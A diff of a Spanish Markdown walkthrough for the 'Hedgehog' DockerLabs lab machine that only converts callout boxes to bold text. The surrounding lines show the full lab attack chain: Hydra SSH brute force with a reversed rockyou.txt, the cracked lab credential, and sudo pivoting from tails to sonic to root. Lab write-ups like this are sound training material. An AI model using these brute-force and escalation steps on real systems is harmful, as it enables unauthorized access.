@@ -16,15 +16,15 @@ técnicas:
 fecha: 2026-06-12
 ---
 
-# Máquina: Hedgehog
+# 🦔 Máquina: Hedgehog
 
-> [!info] Información general
->
-> - **Plataforma:** DockerLabs
-> - **Dificultad:** Muy fácil
-> - **SO:** Ubuntu 24.04.1 LTS
-> - **IP objetivo:** `172.17.0.2`
-> - **Técnicas:** Enumeración web · Fuerza bruta SSH · Escalada lateral con sudo
+## Información general
+
+- **Plataforma:** DockerLabs
+- **Dificultad:** Muy fácil
+- **SO:** Ubuntu 24.04.1 LTS
+- **IP objetivo:** `172.17.0.2`
+- **Técnicas:** Enumeración web · Fuerza bruta SSH · Escalada lateral con sudo
 
 ---
 
@@ -49,7 +49,7 @@ ping 172.17.0.2
 64 bytes from 172.17.0.2: icmp_seq=2 ttl=64 time=0.058 ms
 ```
 
-> [!tip] TTL = 64 → Sistema Linux confirmado
+**TTL = 64 → Sistema Linux confirmado**
 
 ---
 
@@ -84,7 +84,7 @@ Content-Type: text/html
 tails
 ```
 
-> [!success] La página solo contiene la palabra `tails` — usuario identificado.
+**La página solo contiene la palabra `tails` — usuario identificado.**
 
 ---
 
@@ -96,7 +96,7 @@ Con el usuario `tails` y el puerto SSH abierto, lanzamos Hydra con rockyou.txt.
 hydra -l tails -P ~/Desktop/Lists/Rockyou/rockyou.txt -v -t 4 ssh://172.17.0.2 -o hydra.txt
 ```
 
-> [!warning] rockyou.txt tiene más de 14 millones de entradas ordenadas por frecuencia de uso, con las contraseñas más comunes al principio. Si la contraseña objetivo está al final de la lista, el ataque puede tardar horas.
+**Nota:** rockyou.txt tiene más de 14 millones de entradas ordenadas por frecuencia de uso. Si la contraseña objetivo está al final de la lista, el ataque puede tardar horas.
 
 Para acortar el tiempo, invertimos el orden de la lista y eliminamos espacios sobrantes:
 
@@ -104,7 +104,7 @@ Para acortar el tiempo, invertimos el orden de la lista y eliminamos espacios so
 tac rockyou.txt | tr -d ' ' > rockyourev.txt
 ```
 
-> [!note] `tac` imprime el archivo de abajo hacia arriba. Combinado con `tr -d ' '` eliminamos espacios que podrían causar falsos negativos en Hydra.
+**Explicación:** `tac` imprime el archivo de abajo hacia arriba. Combinado con `tr -d ' '` eliminamos espacios que podrían causar falsos negativos en Hydra.
 
 ```bash
 hydra -l tails -P ~/Desktop/Lists/Rockyou/rockyourev.txt -v -t 4 ssh://172.17.0.2 -o hydra.txt
@@ -116,7 +116,7 @@ hydra -l tails -P ~/Desktop/Lists/Rockyou/rockyourev.txt -v -t 4 ssh://172.17.0.
 [22][ssh] host: 172.17.0.2   login: tails   password: 3117548331
 ```
 
-> [!success] Credenciales válidas: **`tails:3117548331`**
+**Credenciales válidas:** `tails:3117548331`
 
 ---
 
@@ -147,7 +147,7 @@ User tails may run the following commands on a43d7b228205:
     (sonic) NOPASSWD: ALL
 ```
 
-> [!note] `tails` no puede ejecutar comandos como `root` directamente, pero sí puede ejecutar **cualquier comando como el usuario `sonic`** sin contraseña. Esto es una escalada lateral, no vertical — primero hay que pivotar a `sonic` y luego intentar escalar a root desde ahí.
+**Nota:** `tails` no puede ejecutar comandos como `root` directamente, pero sí puede ejecutar **cualquier comando como el usuario `sonic`** sin contraseña. Esto es una escalada lateral, no vertical — primero hay que pivotar a `sonic` y luego intentar escalar a root desde ahí.
 
 ---
 
@@ -162,7 +162,7 @@ sonic@a43d7b228205:/home/tails$ id
 uid=1001(sonic) gid=1001(sonic) groups=1001(sonic),27(sudo)
 ```
 
-> [!success] Somos `sonic`. Observamos que pertenece al grupo **`sudo`**, lo que significa que puede ejecutar comandos como root.
+**Somos `sonic`.** Observamos que pertenece al grupo **`sudo`**, lo que significa que puede ejecutar comandos como root.
 
 ---
 
@@ -182,7 +182,7 @@ root@a43d7b228205:/home/tails# whoami
 root
 ```
 
-> [!success] Acceso **root** obtenido.
+**Acceso root obtenido.**
 
 ---
 
